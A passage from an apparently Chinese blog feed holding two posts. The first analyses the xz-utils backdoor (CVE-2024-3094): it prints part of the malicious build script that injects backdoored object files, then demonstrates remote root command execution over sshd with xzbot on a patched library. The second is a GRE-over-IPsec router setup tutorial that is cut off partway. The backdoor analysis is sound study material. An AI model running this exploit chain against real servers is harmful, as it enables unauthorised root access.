$liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2&gt;/dev/null; then</span><br><span class="hljs-string">cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true</span><br><span class="hljs-string">eval $BPep</span><br><span class="hljs-string">if sed &quot;/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()&quot; $top_srcdir/src/liblzma/check/crc32_fast.c | \</span><br><span class="hljs-string">sed &quot;/include \&quot;crc32_arm64.h\&quot;/a \\$V&quot; | \</span><br><span class="hljs-string">sed &quot;1i # 0 \&quot;$top_srcdir/src/liblzma/check/crc32_fast.c\&quot;&quot; 2&gt;/dev/null | \</span><br><span class="hljs-string">$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then</span><br><span class="hljs-string">eval $RgYB</span><br><span class="hljs-string">if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then</span><br><span class="hljs-string">if test ! -f .libs/liblzma.so; then</span><br><span class="hljs-string">mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true</span><br><span class="hljs-string">mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true</span><br><span class="hljs-string">fi</span><br><span class="hljs-string">rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true</span><br><span class="hljs-string">else</span><br><span class="hljs-string">mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true</span><br><span class="hljs-string">mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true</span><br><span class="hljs-string">fi</span><br><span class="hljs-string">rm -f .libs/liblzma_la-crc32-fast.o || true</span><br><span class="hljs-string">rm -f .libs/liblzma_la-crc64-fast.o || true</span><br><span class="hljs-string">else</span><br><span class="hljs-string">mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true</span><br><span class="hljs-string">mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true</span><br><span class="hljs-string">fi</span><br><span class="hljs-string">else</span><br><span class="hljs-string">mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true</span><br><span class="hljs-string">fi</span><br><span class="hljs-string">rm -f liblzma_la-crc64-fast.o || true</span><br><span class="hljs-string">fi</span><br><span class="hljs-string">eval $DHLd</span><br></code></pre></td></tr></table></figure><blockquote><p>[ ! $(uname)=“Linux” ] &amp;&amp; exit 0 其實沒有空格會導致這行無作用</p></blockquote>        </div>      </div>    </div><p>phase2 payload將會檢查許多條件，如果符合，就會開始後門的植入</p><p>這會繼續從<code>tests/files/good-large_compressed.lzma</code>中解壓縮出<code>liblzma_la-crc64-fast.o</code>和<code>liblzma_la-crc32-fast.o</code>，這是個惡意的連接檔</p><p>並將原本的檔案做備份到名稱接近的檔案</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o<br></code></pre></td></tr></table></figure><p>接著就是修改編譯的檔案，植入後門</p><p>最後根據成功或失敗，把解壓縮的檔案清除，或將備份的檔案復原</p><p>如果想瞭解更詳細的植入過程，可以參考此網站<a href="https://research.swtch.com/xz-script">research!rsc: The xz attack shell script</a><sup id="fnref:6" class="footnote-ref"><a href="#fn:6" rel="footnote"><span class="hint--top hint--rounded" aria-label="[research!rsc: The xz attack shell script](https://research.swtch.com/xz-script)">[6]</span></a></sup></p><p>或是參考這張圖理解，此圖來自<a href="https://twitter.com/fr0gger_/status/1774342248437813525">Thomas Roccia</a></p><p><img src="xz-infographic.jpeg" alt=""></p><p>有關對liblzma_la-crc32-fast.o、liblzma_la-crc64-fast.o的逆向分析，可以參考以下連結</p><p><a href="https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504">[WIP] XZ Backdoor Analysis and symbol mapping</a></p><p><a href="https://github.com/smx-smx/xzre">smx-smx/xzre: XZ backdoor reverse engineering</a></p><p><a href="https://www.wevul.com/8192.html">XZ-Utils供应链威胁揭秘：后门投毒深度分析与防御策略 - 网络攻防</a></p><p>超級懶人包：簡單來說就是透過liblzma_la-crc32-fast.o、liblzma_la-crc64-fast.o這兩個連接檔，在編譯時修改了原本<code>_get_cpuid()</code>函數，在執行時透過gcc ifunc劫持openssl的<code>RSA_public_decrypt()</code>函數，達成後門</p><h2 id="xz與sshd-rce的關係">xz與sshd/rce的關係</h2><p>理論上openssh並不依賴liblzma，但是debian等發行版修改了openssh，為openssh打上了patch，讓其支援systemd的通知，因此依賴了libsystemd，而libsystemd依賴liblzma，因此openssh間接依賴liblzma，這導致後門的產生。</p><h1 id="演示">演示</h1><p>以下參考<a href="https://github.com/amlweems/xzbot">amlweems/xzbot</a><sup id="fnref:7" class="footnote-ref"><a href="#fn:7" rel="footnote"><span class="hint--top hint--rounded" aria-label="[amlweems/xzbot](https://github.com/amlweems/xzbot)">[7]</span></a></sup></p><h3 id="honeypot">honeypot</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/openssh/openssh-portable</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">patch -p1 &lt; ~/path/to/openssh.patch</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">autoreconf</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">./configure</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><h3 id="下載並安裝有漏洞的xz-utils和liblzma">下載並安裝有漏洞的xz-utils和liblzma</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://snapshot.debian.org/archive/debian/20240328T025657Z/pool/main/x/xz-utils/xz-utils_5.6.1-1_amd64.deb</span><br>--2024-04-30 16:53:29--  https://snapshot.debian.org/archive/debian/20240328T025657Z/pool/main/x/xz-utils/xz-utils_5.6.1-1_amd64.deb<br>Resolving snapshot.debian.org (snapshot.debian.org)... 185.17.185.185, 193.62.202.27, 2001:630:206:4000:1a1a:0:c13e:ca1b, ...<br>Connecting to snapshot.debian.org (snapshot.debian.org)|185.17.185.185|:443... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 491980 (480K)<br>Saving to: ‘xz-utils_5.6.1-1_amd64.deb.1’<br><br>xz-utils_5.6.1-1_amd64.deb.1 100%[=============================================&gt;] 480.45K   322KB/s    in 1.5s<br><br>2024-04-30 16:53:32 (322 KB/s) - ‘xz-utils_5.6.1-1_amd64.deb.1’ saved [491980/491980]<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://snapshot.debian.org/archive/debian/20240328T025657Z/pool/main/x/xz-utils/liblzma5_5.6.1-1_amd64.deb</span><br>--2024-04-30 16:53:54--  https://snapshot.debian.org/archive/debian/20240328T025657Z/pool/main/x/xz-utils/liblzma5_5.6.1-1_amd64.deb<br>Resolving snapshot.debian.org (snapshot.debian.org)... 185.17.185.185, 193.62.202.27, 2001:1af8:4020:b030:deb::185, ...<br>Connecting to snapshot.debian.org (snapshot.debian.org)|185.17.185.185|:443... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 252188 (246K)<br>Saving to: ‘liblzma5_5.6.1-1_amd64.deb.1’<br><br>liblzma5_5.6.1-1_amd64.deb.1 100%[=============================================&gt;] 246.28K   212KB/s    in 1.2s<br><br>2024-04-30 16:53:56 (212 KB/s) - ‘liblzma5_5.6.1-1_amd64.deb.1’ saved [252188/252188]<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">dpkg -i xz-utils_5.6.1-1_amd64.deb liblzma5_5.6.1-1_amd64.deb</span><br>(Reading database ... 55615 files and directories currently installed.)<br>Preparing to unpack xz-utils_5.6.1-1_amd64.deb ...<br>Unpacking xz-utils (5.6.1-1) over (5.6.1-1) ...<br>Preparing to unpack liblzma5_5.6.1-1_amd64.deb ...<br>Unpacking liblzma5:amd64 (5.6.1-1) over (5.6.1-1) ...<br>Setting up liblzma5:amd64 (5.6.1-1) ...<br>Setting up xz-utils (5.6.1-1) ...<br>Processing triggers for man-db (2.11.2-2) ...<br>Processing triggers for libc-bin (2.36-9+deb12u6) ...<br></code></pre></td></tr></table></figure><h3 id="patch-liblzma-so">patch liblzma.so</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip install pwntools</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">shasum -a 256 liblzma.so.5.6.1</span><br>605861f833fc181c7cdcabd5577ddb8989bea332648a8f498b4eef89b8f85ad4  liblzma.so.5.6.1<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">python3 patch.py /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1</span><br>Patching func at offset: 0x24470<br>Generated patched so: liblzma.so.5.6.1.patch<br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cp</span> /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1 /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1.ori</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cp</span> /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1.patch /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1</span><br></code></pre></td></tr></table></figure><h3 id="backdoor-demo">backdoor demo</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">go install github.com/amlweems/xzbot@latest</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">xzbot -h</span><br>Usage of xzbot:<br>  -addr string<br>        ssh server address (default &quot;127.0.0.1:2222&quot;)<br>  -seed string<br>        ed448 seed, must match xz backdoor key (default &quot;0&quot;)<br>  -cmd string<br>        command to run via system() (default &quot;id &gt; /tmp/.xz&quot;)<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">xzbot -addr 127.0.0.1:22 -cmd <span class="hljs-string">&#x27;id &gt; /tmp/.xz&#x27;</span></span><br>00000000  00 00 00 1c 73 73 68 2d  72 73 61 2d 63 65 72 74  |....ssh-rsa-cert|<br>00000010  2d 76 30 31 40 6f 70 65  6e 73 73 68 2e 63 6f 6d  |-v01@openssh.com|<br>00000020  00 00 00 00 00 00 00 03  01 00 01 00 00 01 01 01  |................|<br>00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>000000b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>000000c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>000000d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>000000e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>000000f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000100  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000110  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000120  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000130  00 00 00 00 00 00 00 00  00 00 00 01 00 00 00 00  |................|<br>00000140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000150  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000160  00 00 01 14 00 00 00 07  73 73 68 2d 72 73 61 00  |........ssh-rsa.|<br>00000170  00 00 01 01 00 00 01 00  34 12 00 00 78 56 00 00  |........4...xV..|<br>00000180  a2 ff d9 f9 ff ff ff ff  ee 07 97 d2 f3 7b 74 d0  |.............&#123;t.|<br>00000190  77 0e ac cd 7d 9f 9d 20  66 18 6f b4 63 92 1e 08  |w...&#125;.. f.o.c...|<br>000001a0  01 99 59 55 5c e2 1c 2c  48 6e aa 90 f6 4c 38 4c  |..YU\..,Hn...L8L|<br>000001b0  df 97 38 87 d3 b9 f9 e5  c0 c9 6e ed 79 a2 b0 e1  |..8.......n.y...|<br>000001c0  38 81 22 08 17 b1 46 ba  4f 2a 34 98 a2 04 53 7f  |8.&quot;...F.O*4...S.|<br>000001d0  87 3b f2 02 ba e9 e9 16  bd 12 34 4d 3a 1b ae dc  |.;........4M:...|<br>000001e0  31 d8 03 13 05 a8 a6 b6  10 bd 5d c0 80 27 fd e7  |1.........]..&#x27;..|<br>000001f0  9a 7a d2 53 cb 4d 1b d7  9f 1d bf 47 b9 5f a0 49  |.z.S.M.....G._.I|<br>00000200  8c 28 de ce 0a ff 6f 47  0c d2 34 a9 35 00 00 00  |.(....oG..4.5...|<br>00000210  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000220  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000230  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000240  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000250  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000260  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000270  00 00 00 00 00 00 00 00  00 00 00 10 00 00 00 07  |................|<br>00000280  73 73 68 2d 72 73 61 00  00 00 01 00              |ssh-rsa.....|<br>2024/04/30 16:57:38 ssh: handshake failed: EOF<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /tmp/.xz</span><br>uid=0(root) gid=0(root) groups=0(root)<br></code></pre></td></tr></table></figure><h2 id="參考">參考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">oss-security - backdoor in upstream xz/liblzma leading to ssh server compromise</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27#design">FAQ on the xz-utils backdoor (CVE-2024-3094)</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://man7.org/linux/man-pages/man7/landlock.7.html">landlock(7) - Linux manual page</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://cmake.org/cmake/help/latest/module/CheckCSourceCompiles.html">CheckCSourceCompiles — CMake 3.29.2 Documentation</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span><a href="https://cmake.org/cmake/help/latest/module/CheckIncludeFile.html">CheckIncludeFile — CMake 3.29.2 Documentation</a><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:6" class="footnote-text"><span><a href="https://research.swtch.com/xz-script">research!rsc: The xz attack shell script</a><a href="#fnref:6" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:7" class="footnote-text"><span><a href="https://github.com/amlweems/xzbot">amlweems/xzbot</a><a href="#fnref:7" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:8" class="footnote-text"><span><a href="https://tukaani.org/xz-backdoor/">XZ Utils backdoor</a><a href="#fnref:8" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:9" class="footnote-text"><span><a href="https://gist.github.com/martenson/398bdb7a928069cf67606c9ba919a7ce">xz-utils backdoor situation</a><a href="#fnref:9" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:10" class="footnote-text"><span><a href="https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27">xz-utils backdoor situation (CVE-2024-3094)</a><a href="#fnref:10" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>資安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xz</tag>
      
      <tag>CVE-2024-3094</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在EdgeOS和RouterOS之間建立GRE over IPsec tunnel</title>
    <link href="/gre-over-ipsec-between-edgeos-and-routeros/"/>
    <url>/gre-over-ipsec-between-edgeos-and-routeros/</url>
    
    <content type="html"><![CDATA[<h1 id="介紹">介紹</h1><p>一般來說建立GRE over IPsec tunnel有三種方法<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[ GRE Over IPsec for Secure Tunneling : VyOS Support Portal ](https://support.vyos.io/support/solutions/articles/103000096326-gre-over-ipsec-for-secure-tunneling)">[1]</span></a></sup></p><ul><li>GRE over IPsec transport mode</li><li>GRE over IPsec tunnel mode</li><li>Virtual Tunnel Interface (VTI)</li></ul><p>不過RouterOS好像到現在都還不支持VTI，因此本文中不會討論</p><p><img src="ipsec_enc.jpg" alt=""></p><h2 id="GRE-over-IPsec-transport-mode">GRE over IPsec transport mode</h2><p>GRE over IPsec transport mode簡單來說就是建立一個GRE tunnel，並設定IPsec transport mode保護在兩個peer中傳輸的封包內容，ESP只會保護Data段的內容，因此IP Header之類的資訊還是可以被得知</p><p>這種方式缺點是萬一兩邊的IPsec並沒有成功建立、或是連線中斷，由於GRE tunnel是直接使用對方的public IP連線，有可能GRE tunnel會直接在public internet中裸奔，且兩邊都必須有public IP，不能位於NAT後方。</p><h2 id="GRE-over-IPsec-tunnel-mode">GRE over IPsec tunnel mode</h2><p>GRE over IPsec tunnel mode則是先在兩個peer間建立IPsec tunnel，接著使用IPsec tunnel中的IP去建立GRE tunnel，此時GRE tunnel的整個封包都會被ESP給包住，因此達到加密的效果。</p><p>在IPsec連線未成功建立或中斷時，GRE tunnel將無法通訊，這既是缺點也是優點，可以防止通訊裸露在public internet中，但是由於過了兩個tunnel，因此mtu會較低，可能會對速度造成影響</p><h1 id="操作">操作</h1><p>網路拓樸如下，請自行替換對應的IP</p><table><thead><tr><th style="text-align:center"></th><th style="text-align:center"><strong>public IP(WAN IP)</strong></th><th style="text-align:center"><strong>tunnel interface IP</strong></th><th style="text-align:center"><strong>內部網路</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>RouterOS</strong></td><td style="text-align:center">203.0.113.1</td><td style="text-align:center">10.2.1.1/30</td><td style="text-align:center">192.168.1.254/24</td></tr><tr><td style="text-align:center"><strong>EdgeOS</strong></td><td style="text-align:center">203.0.113.2</td><td style="text-align:center">10.2.1.2/30</td><td style="text-align:center">192.168.2.254/24</td></tr></tbody></table><p><img src="network_topology.png" alt=""></p><h2 id="GRE-over-IPsec-transport-mode-2">GRE over IPsec transport mode</h2><p>待更新</p><p>也許可以先參考DN42發布的這篇文章<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="[howto/EdgeOS GRE IPsec Example](https://dn42.eu/howto/EdgeOS-GRE-IPsec-Example)">[2]</span></a></sup>研究看看，Ubiquiti Help Center中並沒有IPsec transport mode的相關文件</p><h2 id="GRE-over-IPsec-tunnel-mode-2">GRE over IPsec tunnel mode</h2><p>在這部份中，將會在兩個peer上建立loopback interface，IPsec tunnel將設定成只會轉發對方loopback interface 的IP</p><p>下表是示範時使用的IP，如果要使用其他IP，請替換對應的位置</p><table><thead><tr><th style="text-align:center"></th><th style="text-align:center"><strong>loopback interface IP</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>RouterOS</strong></td><td style="text-align:center">10.1.1.1/32</td></tr><tr><td style="text-align:center"><strong>EdgeOS</strong></td><td style="text-align:center">10.1.1.2/32</td></tr></tbody></table><h3 id="IPsec-tunnel">IPsec tunnel</h3><p>此部份大部分參考這些文件<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="[How to create an IPsec VPN between Unifi USG and Mikrotik firewalls](https://github.com/iisti/how-to-usg-mikrotik-ipsec-vpn)">[3]</span></a></sup><sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><span class="hint--top hint--rounded" aria-label="[EdgeRouter to MikroTik IPSec VPN](https://docs.google.com/document/d/13WTT3wZgejNWP0EPNeKQ24XXCVFM3g521doVrzeHqtg/edit)">[4]</span></a></sup>，但在此之上做了一些小修改</p><h4 id="RouterOS">RouterOS</h4><h5 id="IP-IPsec-Profiles-new">IP -&gt; IPsec -&gt; Profiles -&gt; new</h5><p>Profile 是IKE phase1協商的參數</p><p><img src="routeros/ipsec_new_profile.png" alt=""></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-832d777c" role="button" aria-expanded="false" aria-controls="collapse-832d777c">        <div class="fold-arrow">▶</div>更改EdgeOS端Encryption的參數      </div>      <div class="fold-collapse collapse" id="collapse-832d777c">        <div class="fold-content">          <p>如果想更改EdgeOS端Encryption的參數，要在這裡修改對應的參數</p><p><img src="routeros/ipsec_profile_encryption_change.png" alt=""></p>        </div>      </div>    </div><h5 id="IP-IPsec-Peers-new">IP -&gt; IPsec -&gt; Peers -&gt; new</h5><p><img src="routeros/ipsec_new_peer.png" alt=""></p><h5 id="IP-IPsec-Identities-new">IP -&gt; IPsec -&gt; Identities -&gt; new</h5><p><img src="routeros/ipsec_new_indentities.png" alt=""></p><p>先不用在意底下的警告，等最後再回來確認就好</p><h5 id="IP-IPsec-Proposals-new">IP -&gt; IPsec -&gt; Proposals -&gt; new</h5><p><img src="routeros/ipsec_new_proposal.png" alt=""></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-ba6eecfc" role="button" aria-expanded="false" aria-controls="collapse-ba6eecfc">        <div class="fold-arrow">▶</div>更改EdgeOS端DH Group的參數      </div>      <div class="fold-collapse collapse" id="collapse-ba6eecfc">        <div class="fold-content">          <p>如果想更改EdgeOS端DH Group的參數，要在這裡修改對應的參數</p><p><img src="routeros/ipsec_proposal_dhgroup_change.png" alt=""></p>        </div>      </div>    </div><h5 id="建立loopback-interface">建立loopback interface</h5><p>由於RouterOS沒有loopback interface一類的設備<sup id="fnref:5" class="footnote-ref"><a href="#fn:5" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Dummy or Loopback interface](https://forum.mikrotik.com/viewtopic.php?t=108227)">[5]</span></a></sup><sup id="fnref:6" class="footnote-ref"><a href="#fn:6" rel="footnote"><span class="hint--top hint--rounded" aria-label="[loopback interface in mikrotik](https://forum.mikrotik.com/viewtopic.php?t=187390)">[6]</span></a></sup>，因此創建loopback interface的方法會是建立一個空的bridge，然後給予這個bridge一個IP</p><h6 id="Bridge-Bridge-new">Bridge -&gt; Bridge -&gt; new</h6><p><img src="routeros/new_bridge_general.png" alt=""></p><p><img src="routeros/new_bridge_stp.png" alt=""></p><p>其他設定保持默認就好</p><h6 id="IP-Addresses-new">IP -&gt; Addresses -&gt; new</h6><p><img src="routeros/loopback_interface_ip.png" alt=""></p><h5 id="IP-IPsec-Policies-new">IP -&gt; IPsec -&gt; Policies -&gt; new</h5><p><img src="routeros/ipsec_new_polices_general.png" alt=""></p><p><img src="routeros/ipsec_new_polices_action.png" alt=""></p><p>如果要轉發多個子網的話Action部分的Level要設定為unique，不過此次設定只需要轉發兩端router的IP就好</p><h5 id="IP-Firewall-NAT-new">IP -&gt; Firewall -&gt; NAT -&gt; new</h5><p><img src="routeros/firewall_nat_rule_general.png" alt=""></p><p><img src="routeros/firewall_nat_rule_action.png" alt=""></p><p>要將此條規則移至最上方</p><h4 id="EdgeOS">EdgeOS</h4><h5 id="創建loopback-interface">創建loopback interface</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">set interfaces loopback lo address 10.1.1.2/32<br></code></pre></td></tr></table></figure><h5 id="設定IPsec-Site-to-Site-VPN">設定IPsec Site to Site VPN</h5><p>VPN頁面 -&gt; IPsec Site-to-Site</p><p><img src="edgeos_ipsec_vpn.png" alt=""></p><p>完成這些設定後，兩端的IPsec tunnel應該就架好了，可以嘗試互相ping看看對方的loopback inerface IP，使用RouterOS ping時記得要指定來源IP為loopback inerface IP</p><p>在IPsec 的Active Peers和Installed SAs應該就能看到東西出現了</p><h3 id="GRE-tunnel">GRE tunnel</h3><h4 id="RouterOS-2">RouterOS</h4><h5 id="Interfaces-GRE-Tunnel-new">Interfaces -&gt; GRE Tunnel -&gt; new</h5><p><img src="routeros/gre_new_interface.png" alt=""></p><p>設定成功後應該會顯示mtu的資訊</p><p><img src="routeros/gre_interface_status.png" alt=""></p><h5 id="IP-Addresses-new-2">IP -&gt; Addresses -&gt; new</h5><p><img src="routeros/gre_interface_ip.png" alt=""></p><h5 id="IP-Routes-new">IP -&gt; Routes -&gt; new</h5><p><img src="routeros/gre_new_routes.png" alt=""></p><h4 id="EdgeOS-sup-id-fnref-7-class-footnote-ref-a-href-fn-7-rel-footnote-span-class-hint-top-hint-rounded-aria-label-EdgeRouter-GRE-Tunnel-https-help-ui-com-hc-en-us-articles-205231690-EdgeRouter-GRE-Tunnel-7-span-a-sup">EdgeOS<sup id="fnref:7" class="footnote-ref"><a href="#fn:7" rel="footnote"><span class="hint--top hint--rounded" aria-label="[EdgeRouter - GRE Tunnel ](https://help.ui.com/hc/en-us/articles/205231690-EdgeRouter-GRE-Tunnel)">[7]</span></a></sup></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">configure<br>set interfaces tunnel tun0 local-ip 10.1.1.2<br>set interfaces tunnel tun0 remote-ip 10.1.1.1<br>set interfaces tunnel tun0 encapsulation<br>set interfaces tunnel tun0 encapsulation gre<br>set interfaces tunnel tun0 address 10.2.1.2/30<br>set protocols static interface-route 192.168.1.0/24 